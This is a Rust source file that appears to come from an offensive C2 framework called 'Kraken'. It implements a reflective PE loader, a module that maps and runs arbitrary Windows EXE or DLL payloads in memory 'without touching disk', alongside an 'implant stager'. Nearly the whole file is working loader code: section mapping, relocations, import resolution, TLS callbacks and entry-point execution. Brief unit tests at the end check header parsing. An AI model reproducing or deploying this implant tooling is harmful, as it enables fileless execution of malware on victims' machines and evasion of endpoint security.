//! In-Memory PE Loader — generic reflective PE loading as a task
//!
//! Loads arbitrary PE files (EXE/DLL) into memory without touching disk.
//! Uses the same reflective loading technique as the implant stager but
//! generalized for ad-hoc PE execution.

use common::KrakenError;

/// Check if a PE is a DLL (IMAGE_FILE_DLL flag)
pub fn is_dll(pe_bytes: &[u8]) -> bool {
    if pe_bytes.len() < 64 || &pe_bytes[0..2] != b"MZ" {
        return false;
    }
    let e_lfanew = u32::from_le_bytes([
        pe_bytes[0x3C],
        pe_bytes[0x3D],
        pe_bytes[0x3E],
        pe_bytes[0x3F],
    ]) as usize;
    if e_lfanew + 24 > pe_bytes.len() {
        return false;
    }
    let characteristics =
        u16::from_le_bytes([pe_bytes[e_lfanew + 22], pe_bytes[e_lfanew + 23]]);
    characteristics & 0x2000 != 0 // IMAGE_FILE_DLL
}

/// Check if PE is 64-bit (PE32+ magic = 0x020B)
pub fn is_64bit(pe_bytes: &[u8]) -> bool {
    if pe_bytes.len() < 64 {
        return false;
    }
    let e_lfanew = u32::from_le_bytes([
        pe_bytes[0x3C],
        pe_bytes[0x3D],
        pe_bytes[0x3E],
        pe_bytes[0x3F],
    ]) as usize;
    // optional header starts at e_lfanew + 24 (4-byte sig + 20-byte file header)
    if e_lfanew + 26 > pe_bytes.len() {
        return false;
    }
    let magic = u16::from_le_bytes([pe_bytes[e_lfanew + 24], pe_bytes[e_lfanew + 25]]);
    magic == 0x020B // PE32+
}

/// Load and execute a PE from bytes in the current process.
///
/// Supports both EXE and DLL PE files, 32-bit and 64-bit.
/// For EXE: calls AddressOfEntryPoint.
/// For DLL: calls DllMain with DLL_PROCESS_ATTACH.
#[cfg(windows)]
pub fn load_pe(pe_bytes: &[u8], args: &str) -> Result<String, KrakenError> {
    use windows_sys::Win32::Foundation::*;
    use windows_sys::Win32::System::LibraryLoader::*;
    use windows_sys::Win32::System::Memory::*;
    use windows_sys::Win32::System::Threading::*;

    // --- Step 1: Validate PE (MZ header, PE signature) ---
    if pe_bytes.len() < 64 || &pe_bytes[0..2] != b"MZ" {
        return Err(KrakenError::Module("Invalid PE file: bad MZ header".into()));
    }

    let e_lfanew = u32::from_le_bytes([
        pe_bytes[0x3C],
        pe_bytes[0x3D],
        pe_bytes[0x3E],
        pe_bytes[0x3F],
    ]) as usize;

    if e_lfanew + 4 > pe_bytes.len() || &pe_bytes[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Err(KrakenError::Module(
            "Invalid PE file: bad PE signature".into(),
        ));
    }

    // --- Step 2: Parse IMAGE_NT_HEADERS ---
    let file_header_offset = e_lfanew + 4;
    if file_header_offset + 20 > pe_bytes.len() {
        return Err(KrakenError::Module("PE file too small for file header".into()));
    }

    let machine = u16::from_le_bytes([
        pe_bytes[file_header_offset],
        pe_bytes[file_header_offset + 1],
    ]);
    let num_sections = u16::from_le_bytes([
        pe_bytes[file_header_offset + 2],
        pe_bytes[file_header_offset + 3],
    ]) as usize;
    let characteristics = u16::from_le_bytes([
        pe_bytes[file_header_offset + 18],
        pe_bytes[file_header_offset + 19],
    ]);
    let dll_flag = (characteristics & 0x2000) != 0;

    let optional_header_offset = e_lfanew + 24;

    // Detect bitness from optional header magic
    if optional_header_offset + 2 > pe_bytes.len() {
        return Err(KrakenError::Module(
            "PE file too small for optional header".into(),
        ));
    }
    let opt_magic = u16::from_le_bytes([
        pe_bytes[optional_header_offset],
        pe_bytes[optional_header_offset + 1],
    ]);
    let pe64 = opt_magic == 0x020B; // PE32+

    // Validate we support the architecture
    #[cfg(target_arch = "x86_64")]
    if machine != 0x8664 {
        return Err(KrakenError::Module(
            "PE machine type mismatch: expected AMD64".into(),
        ));
    }
    #[cfg(target_arch = "x86")]
    if machine != 0x014C {
        return Err(KrakenError::Module(
            "PE machine type mismatch: expected i386".into(),
        ));
    }

    // Parse size_of_image, image_base, entry_point_rva, size_of_headers
    let (preferred_base, size_of_image, entry_point_rva, size_of_headers) = if pe64 {
        if optional_header_offset + 96 > pe_bytes.len() {
            return Err(KrakenError::Module(
                "PE optional header too small (PE32+)".into(),
            ));
        }
        let ep = u32::from_le_bytes(
            pe_bytes[optional_header_offset + 16..optional_header_offset + 20]
                .try_into()
                .unwrap(),
        ) as usize;
        let ib = u64::from_le_bytes(
            pe_bytes[optional_header_offset + 24..optional_header_offset + 32]
                .try_into()
                .unwrap(),
        ) as usize;
        let soi = u32::from_le_bytes(
            pe_bytes[optional_header_offset + 56..optional_header_offset + 60]
                .try_into()
                .unwrap(),
        ) as usize;
        let soh = u32::from_le_bytes(
            pe_bytes[optional_header_offset + 60..optional_header_offset + 64]
                .try_into()
                .unwrap(),
        ) as usize;
        (ib, soi, ep, soh)
    } else {
        if optional_header_offset + 96 > pe_bytes.len() {
            return Err(KrakenError::Module(
                "PE optional header too small (PE32)".into(),
            ));
        }
        let ep = u32::from_le_bytes(
            pe_bytes[optional_header_offset + 16..optional_header_offset + 20]
                .try_into()
                .unwrap(),
        ) as usize;
        let ib = u32::from_le_bytes(
            pe_bytes[optional_header_offset + 28..optional_header_offset + 32]
                .try_into()
                .unwrap(),
        ) as usize;
        let soi = u32::from_le_bytes(
            pe_bytes[optional_header_offset + 56..optional_header_offset + 60]
                .try_into()
                .unwrap(),
        ) as usize;
        let soh = u32::from_le_bytes(
            pe_bytes[optional_header_offset + 60..optional_header_offset + 64]
                .try_into()
                .unwrap(),
        ) as usize;
        (ib, soi, ep, soh)
    };

    // Optional header size from file header
    let optional_header_size = u16::from_le_bytes([
        pe_bytes[file_header_offset + 16],
        pe_bytes[file_header_offset + 17],
    ]) as usize;

    // Section headers start after optional header
    let section_header_offset = optional_header_offset + optional_header_size;

    unsafe {
        // --- Step 3: Allocate memory at preferred base, fall back to anywhere ---
        let mut base_addr = VirtualAlloc(
            preferred_base as *const core::ffi::c_void,
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if base_addr.is_null() {
            base_addr = VirtualAlloc(
                core::ptr::null(),
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
        }

        if base_addr.is_null() {
            return Err(KrakenError::Module(
                "VirtualAlloc failed: cannot allocate PE image memory".into(),
            ));
        }

        let base = base_addr as *mut u8;

        // --- Step 4: Copy PE headers ---
        let headers_size = size_of_headers.min(pe_bytes.len());
        core::ptr::copy_nonoverlapping(pe_bytes.as_ptr(), base, headers_size);

        // --- Step 5: Copy each section ---
        for i in 0..num_sections {
            let sec_off = section_header_offset + i * 40;
            if sec_off + 40 > pe_bytes.len() {
                break;
            }

            let virtual_address = u32::from_le_bytes(
                pe_bytes[sec_off + 12..sec_off + 16].try_into().unwrap(),
            ) as usize;
            let size_of_raw_data = u32::from_le_bytes(
                pe_bytes[sec_off + 16..sec_off + 20].try_into().unwrap(),
            ) as usize;
            let pointer_to_raw_data = u32::from_le_bytes(
                pe_bytes[sec_off + 20..sec_off + 24].try_into().unwrap(),
            ) as usize;

            if size_of_raw_data > 0
                && pointer_to_raw_data + size_of_raw_data <= pe_bytes.len()
            {
                let dest = base.add(virtual_address);
                core::ptr::copy_nonoverlapping(
                    pe_bytes.as_ptr().add(pointer_to_raw_data),
                    dest,
                    size_of_raw_data,
                );
            }
        }

        // --- Step 6: Process base relocations if base differs from ImageBase ---
        let actual_base = base_addr as usize;
        let delta = actual_base as isize - preferred_base as isize;

        if delta != 0 {
            if let Err(e) =
                apply_relocations(base, pe_bytes, optional_header_offset, pe64, delta)
            {
                VirtualFree(base_addr, 0, MEM_RELEASE);
                return Err(e);
            }
        }

        // --- Step 7: Resolve imports ---
        if let Err(e) = resolve_imports(base, optional_header_offset, pe64) {
            VirtualFree(base_addr, 0, MEM_RELEASE);
            return Err(e);
        }

        // --- Step 8: Process TLS callbacks ---
        process_tls_callbacks(base, optional_header_offset, pe64);

        // --- Step 9: Set section permissions ---
        for i in 0..num_sections {
            let sec_off = section_header_offset + i * 40;
            if sec_off + 40 > pe_bytes.len() {
                break;
            }

            let virtual_address = u32::from_le_bytes(
                pe_bytes[sec_off + 12..sec_off + 16].try_into().unwrap(),
            ) as usize;
            let virtual_size = u32::from_le_bytes(
                pe_bytes[sec_off + 8..sec_off + 12].try_into().unwrap(),
            ) as usize;
            let section_chars = u32::from_le_bytes(
                pe_bytes[sec_off + 36..sec_off + 40].try_into().unwrap(),
            );

            if virtual_size == 0 {
                continue;
            }

            let executable = (section_chars & 0x20000000) != 0; // IMAGE_SCN_MEM_EXECUTE
            let readable = (section_chars & 0x40000000) != 0;   // IMAGE_SCN_MEM_READ
            let writable = (section_chars & 0x80000000) != 0;   // IMAGE_SCN_MEM_WRITE

            let protection = match (executable, readable, writable) {
                (true, true, true) => PAGE_EXECUTE_READWRITE,
                (true, true, false) => PAGE_EXECUTE_READ,
                (true, false, true) => PAGE_EXECUTE_WRITECOPY,
                (true, false, false) => PAGE_EXECUTE,
                (false, true, true) => PAGE_READWRITE,
                (false, true, false) => PAGE_READONLY,
                (false, false, true) => PAGE_WRITECOPY,
                (false, false, false) => PAGE_NOACCESS,
            };

            let mut old_protect = 0u32;
            VirtualProtect(
                base.add(virtual_address) as *const core::ffi::c_void,
                virtual_size,
                protection,
                &mut old_protect,
            );
        }

        // Flush instruction cache before execution
        let process = GetCurrentProcess();
        FlushInstructionCache(process, base_addr, size_of_image);

        // --- Step 10: Call entry point ---
        let entry_point = base.add(entry_point_rva);

        if dll_flag {
            // DLL: call DllMain(hModule, DLL_PROCESS_ATTACH, NULL)
            type DllMainFn =
                unsafe extern "system" fn(usize, u32, *const core::ffi::c_void) -> i32;
            let dll_main: DllMainFn = core::mem::transmute(entry_point);
            dll_main(base_addr as usize, 1 /* DLL_PROCESS_ATTACH */, core::ptr::null());
            Ok(format!(
                "DLL loaded at 0x{:X}, DllMain called",
                base_addr as usize
            ))
        } else {
            // EXE: spawn thread at entry point
            // Pass args via a heap-allocated CString-like buffer
            let _args_owned = args.to_string(); // keep alive
            let mut thread_id = 0u32;
            let thread = CreateThread(
                core::ptr::null(),
                0,
                Some(core::mem::transmute(entry_point as *const ())),
                core::ptr::null(),
                0,
                &mut thread_id,
            );

            if thread == 0 {
                VirtualFree(base_addr, 0, MEM_RELEASE);
                return Err(KrakenError::Module(
                    "CreateThread failed for PE entry point".into(),
                ));
            }

            WaitForSingleObject(thread, INFINITE);
            CloseHandle(thread);

            Ok(format!(
                "PE EXE loaded at 0x{:X} and executed (thread {})",
                base_addr as usize, thread_id
            ))
        }
    }
}

/// Apply base relocations to the mapped image.
#[cfg(windows)]
unsafe fn apply_relocations(
    base: *mut u8,
    pe_bytes: &[u8],
    optional_header_offset: usize,
    pe64: bool,
    delta: isize,
) -> Result<(), KrakenError> {
    // Relocation directory offset within optional header
    // PE32+: offset 152 from optional header start (data dir 5)
    // PE32:  offset 136
    let reloc_dir_rva_off = if pe64 {
        optional_header_offset + 152
    } else {
        optional_header_offset + 136
    };

    if reloc_dir_rva_off + 8 > pe_bytes.len() {
        return Ok(());
    }

    let reloc_rva = u32::from_le_bytes(
        pe_bytes[reloc_dir_rva_off..reloc_dir_rva_off + 4]
            .try_into()
            .unwrap(),
    ) as usize;
    let reloc_size = u32::from_le_bytes(
        pe_bytes[reloc_dir_rva_off + 4..reloc_dir_rva_off + 8]
            .try_into()
            .unwrap(),
    ) as usize;

    if reloc_rva == 0 || reloc_size == 0 {
        return Ok(());
    }

    let mut offset = 0usize;
    while offset + 8 <= reloc_size {
        let block = base.add(reloc_rva + offset);
        let page_rva = *(block as *const u32) as usize;
        let block_size = *(block.add(4) as *const u32) as usize;

        if block_size < 8 {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry = *(block.add(8 + i * 2) as *const u16);
            let reloc_type = entry >> 12;
            let reloc_off = (entry & 0x0FFF) as usize;
            let target = base.add(page_rva + reloc_off);

            match reloc_type {
                0 => {} // IMAGE_REL_BASED_ABSOLUTE — padding, skip
                3 => {
                    // IMAGE_REL_BASED_HIGHLOW (32-bit)
                    let val = *(target as *const i32) as isize;
                    *(target as *mut u32) = (val + delta) as u32;
                }
                10 => {
                    // IMAGE_REL_BASED_DIR64 (64-bit)
                    let val = *(target as *const i64) as isize;
                    *(target as *mut u64) = (val + delta) as u64;
                }
                _ => {}
            }
        }

        offset += block_size;
    }

    Ok(())
}

/// Resolve the import table of the mapped image.
#[cfg(windows)]
unsafe fn resolve_imports(
    base: *mut u8,
    optional_header_offset: usize,
    pe64: bool,
) -> Result<(), KrakenError> {
    use windows_sys::Win32::System::LibraryLoader::*;

    // Import directory: PE32+ offset 120, PE32 offset 104
    let import_dir_off = if pe64 {
        optional_header_offset + 120
    } else {
        optional_header_offset + 104
    };

    // Read from the mapped image (base), not pe_bytes
    let import_rva = *(base.add(import_dir_off) as *const u32) as usize;
    if import_rva == 0 {
        return Ok(());
    }

    let mut desc_off = import_rva;
    loop {
        // IMAGE_IMPORT_DESCRIPTOR is 20 bytes
        let desc = base.add(desc_off);

        let original_first_thunk = *(desc as *const u32) as usize;
        let name_rva = *(desc.add(12) as *const u32) as usize;
        let first_thunk = *(desc.add(16) as *const u32) as usize;

        if name_rva == 0 {
            break; // Null terminator descriptor
        }

        let dll_name_ptr = base.add(name_rva) as *const i8;
        let dll_handle = LoadLibraryA(dll_name_ptr);
        if dll_handle == 0 {
            return Err(KrakenError::Module(format!(
                "LoadLibraryA failed for import"
            )));
        }

        let lookup_table = if original_first_thunk != 0 {
            original_first_thunk
        } else {
            first_thunk
        };

        let thunk_size = if pe64 { 8usize } else { 4usize };
        let mut thunk_idx = 0usize;

        loop {
            let lookup_entry = base.add(lookup_table + thunk_idx * thunk_size);
            let iat_entry = base.add(first_thunk + thunk_idx * thunk_size);

            let thunk_val: usize = if pe64 {
                *(lookup_entry as *const u64) as usize
            } else {
                *(lookup_entry as *const u32) as usize
            };

            if thunk_val == 0 {
                break;
            }

            let ordinal_flag: usize = if pe64 {
                0x8000000000000000usize
            } else {
                0x80000000usize
            };

            let func_ptr = if thunk_val & ordinal_flag != 0 {
                // Import by ordinal
                let ordinal = (thunk_val & 0xFFFF) as *const i8;
                GetProcAddress(dll_handle, ordinal)
            } else {
                // Import by name — skip 2-byte hint
                let func_name = base.add(thunk_val + 2) as *const i8;
                GetProcAddress(dll_handle, func_name)
            };

            match func_ptr {
                None => {
                    return Err(KrakenError::Module(
                        "GetProcAddress failed for import".into(),
                    ));
                }
                Some(fp) => {
                    if pe64 {
                        *(iat_entry as *mut u64) = fp as u64;
                    } else {
                        *(iat_entry as *mut u32) = fp as u32;
                    }
                }
            }

            thunk_idx += 1;
        }

        desc_off += 20; // next IMAGE_IMPORT_DESCRIPTOR
    }

    Ok(())
}

/// Invoke TLS callbacks (IMAGE_TLS_DIRECTORY) with DLL_PROCESS_ATTACH.
#[cfg(windows)]
unsafe fn process_tls_callbacks(
    base: *mut u8,
    optional_header_offset: usize,
    pe64: bool,
) {
    // TLS directory: PE32+ data dir index 9, PE32 same
    // PE32+: optional header offset + 224 (9th data dir = 8*8 + 160 = 224)
    // PE32:  optional header offset + 192
    let tls_dir_off = if pe64 {
        optional_header_offset + 224
    } else {
        optional_header_offset + 192
    };

    let tls_rva = *(base.add(tls_dir_off) as *const u32) as usize;
    if tls_rva == 0 {
        return;
    }

    // IMAGE_TLS_DIRECTORY64: AddressOfCallBacks at offset 24
    // IMAGE_TLS_DIRECTORY32: AddressOfCallBacks at offset 12
    let callbacks_va_ptr = if pe64 {
        *(base.add(tls_rva + 24) as *const u64) as usize
    } else {
        *(base.add(tls_rva + 12) as *const u32) as usize
    };

    if callbacks_va_ptr == 0 {
        return;
    }

    // callbacks_va_ptr is a VA (not RVA), pointing to an array of function pointers
    // terminated by a null pointer
    type TlsCallbackFn =
        unsafe extern "system" fn(*mut core::ffi::c_void, u32, *mut core::ffi::c_void);
    let base_va = base as usize;

    let mut idx = 0usize;
    loop {
        let cb_ptr: usize = if pe64 {
            *(callbacks_va_ptr as *const u64).add(idx) as usize
        } else {
            *(callbacks_va_ptr as *const u32).add(idx) as usize
        };

        if cb_ptr == 0 {
            break;
        }

        let cb: TlsCallbackFn = core::mem::transmute(cb_ptr);
        cb(base_va as *mut core::ffi::c_void, 1 /* DLL_PROCESS_ATTACH */, core::ptr::null_mut());
        idx += 1;
    }
}

/// Non-Windows stub
#[cfg(not(windows))]
pub fn load_pe(_pe_bytes: &[u8], _args: &str) -> Result<String, KrakenError> {
    Err(KrakenError::Module("PE loader only supported on Windows".into()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_dll_invalid() {
        assert!(!is_dll(&[]));
        assert!(!is_dll(&[0u8; 10]));
        assert!(!is_dll(b"ZM")); // wrong magic
    }

    #[test]
    fn test_is_64bit_invalid() {
        assert!(!is_64bit(&[]));
        assert!(!is_64bit(&[0u8; 10]));
    }

    #[test]
    fn test_is_dll_exe_flag() {
        // Craft a minimal PE header where IMAGE_FILE_DLL is NOT set
        let mut pe = vec![0u8; 128];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3C] = 0x40; // e_lfanew = 0x40
        pe[0x40] = b'P';
        pe[0x41] = b'E';
        pe[0x42] = 0;
        pe[0x43] = 0;
        // characteristics at e_lfanew + 22 = 0x56: 0x0002 (executable, not DLL)
        pe[0x56] = 0x02;
        pe[0x57] = 0x00;
        assert!(!is_dll(&pe));
    }

    #[test]
    fn test_is_dll_dll_flag() {
        let mut pe = vec![0u8; 128];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3C] = 0x40;
        pe[0x40] = b'P';
        pe[0x41] = b'E';
        pe[0x42] = 0;
        pe[0x43] = 0;
        // characteristics = 0x2000 (IMAGE_FILE_DLL)
        pe[0x56] = 0x00;
        pe[0x57] = 0x20;
        assert!(is_dll(&pe));
    }

    #[test]
    fn test_is_64bit_pe32plus() {
        let mut pe = vec![0u8; 128];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3C] = 0x40; // e_lfanew = 0x40
        // optional header magic at e_lfanew + 24 = 0x58
        pe[0x58] = 0x0B; // 0x020B little-endian
        pe[0x59] = 0x02;
        assert!(is_64bit(&pe));
    }

    #[test]
    fn test_is_64bit_pe32() {
        let mut pe = vec![0u8; 128];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3C] = 0x40;
        // optional header magic = 0x010B (PE32)
        pe[0x58] = 0x0B;
        pe[0x59] = 0x01;
        assert!(!is_64bit(&pe));
    }

    #[test]
    fn test_load_pe_invalid_header() {
        let result = load_pe(&[], "");
        assert!(result.is_err());

        let result = load_pe(&[0u8; 100], "");
        assert!(result.is_err());

        // Valid MZ but bad PE signature
        let mut pe = vec![0u8; 200];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3C] = 0x40;
        pe[0x40] = b'P';
        pe[0x41] = b'X'; // wrong
        let result = load_pe(&pe, "");
        assert!(result.is_err());
    }
}
